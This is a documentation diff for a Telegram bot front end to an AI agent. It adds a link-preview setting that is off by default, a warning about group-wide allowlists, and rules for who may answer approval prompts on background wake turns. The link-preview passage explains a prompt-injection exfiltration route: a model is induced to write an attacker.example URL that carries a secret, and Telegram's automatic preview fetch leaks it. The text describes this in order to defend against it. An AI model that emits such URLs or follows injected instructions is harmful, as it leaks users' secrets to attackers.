@@ -46,6 +46,19 @@ All configuration flows through `TelegramConfig` and can be set via environment 
 | `ODEK_TELEGRAM_DEFAULT_CHAT_ID` | DefaultChatID (`default_chat_id`) | — (used for `--deliver` and as admin fallback) |
 | `ODEK_TELEGRAM_MAX_DOWNLOAD_SIZE` | MaxDownloadSize (`max_download_size`) | 5 MiB (0 = default, <0 = unlimited, >0 = cap in bytes) |
 | `ODEK_TELEGRAM_MEDIA_QUOTA_PER_CHAT` | MediaQuotaPerChat (`media_quota_per_chat`) | 0 (disabled; >0 = per-chat byte quota) |
+| `ODEK_TELEGRAM_LINK_PREVIEW` | LinkPreview (`link_preview`) | false (link previews disabled on every outbound message). Accepts `1`/`t`/`T`/`TRUE`/`true`/`True` and `0`/`f`/`F`/`FALSE`/`false`/`False`; any other value keeps previews disabled and logs a warning |
+
+**Link previews are off by default.** A Telegram link preview makes Telegram's
+servers fetch the URL in a message as soon as it is delivered, with no click.
+If a prompt injection gets the model to write `https://attacker.example/?s=<secret>`
+into an answer, the preview alone sends the secret to the attacker, without any
+shell command or approval. The bot therefore sends
+`link_preview_options: {"is_disabled": true}` on every `sendMessage` and
+`editMessageText` (replies and their chunks, plain-text fallbacks, approvals,
+clarify prompts, notices, scheduled and `--deliver` results, `send_message`, and
+wake-turn output). Set `telegram.link_preview: true` in `~/.odek/config.json` or
+`ODEK_TELEGRAM_LINK_PREVIEW=true` only if you accept that channel. A project
+`./odek.json` cannot enable it: its whole `telegram` section is ignored.
 
 ### Config Validation
 
@@ -216,6 +229,17 @@ All callbacks return a response string (may be empty) and an error. The `Handle`
 > `odek telegram` refuses to start with an error naming the variable and the
 > first bad entry.
 
+> **Warning: `allowed_chats` alone makes every group member a principal.**
+> The two allowlists are combined with AND, and an empty `allowed_users` means
+> "any user in an allowed chat". If `allowed_chats` lists a group or supergroup
+> (negative id) and `allowed_users` is empty, every current and future member
+> of that group can drive the agent, run tools, and answer approval and clarify
+> prompts (each prompt is bound to the member who started the turn, but any
+> member can start one). `odek telegram` prints a startup warning naming such
+> chats. Set `allowed_users` (or `ODEK_TELEGRAM_ALLOWED_USERS`) to the people
+> who should be principals; listing a group without users is only safe for a
+> group whose membership you fully control.
+
 ### Inline Keyboards
 
 The handler uses `sync.Map` for `TelegramApprover` instances, keyed by `chatID`. This allows the agent to send inline keyboard approval requests (yes/no) and receive responses via callback queries. The handler intercepts callback queries matching pending approval requests before dispatching to `OnCallbackQuery`.
@@ -282,7 +306,18 @@ When a background job started from a chat finishes while the chat is idle,
 the bot starts a **system-initiated wake turn**: the model reads the job's
 output (`bg_output`) and reports the results to the chat unprompted. Wake
 turns are marked as system messages — they never appear as if the user had
-sent something.
+sent something. The wake message is persisted with `Name: "bg-wake"` (as on the
+WebUI), so audit and final-answer verification never treat it as an operator
+task.
+
+**Who may answer a wake turn's prompts.** No chat member sent a wake turn, so
+its approval and clarify prompts are bound to the user who last started a turn
+in that chat, or, if nobody has yet, to the only entry of `allowed_users` when
+exactly one is configured. When neither identifies a user, approvals on the
+wake turn are denied without being shown and clarify returns an error to the
+model: a background-job output that provokes an approval can never be approved
+by an arbitrary group member. The binding is resolved when the wake turn
+actually starts (after any turn it queued behind), and `/new` clears it.
 
 Routing per job exit:
 
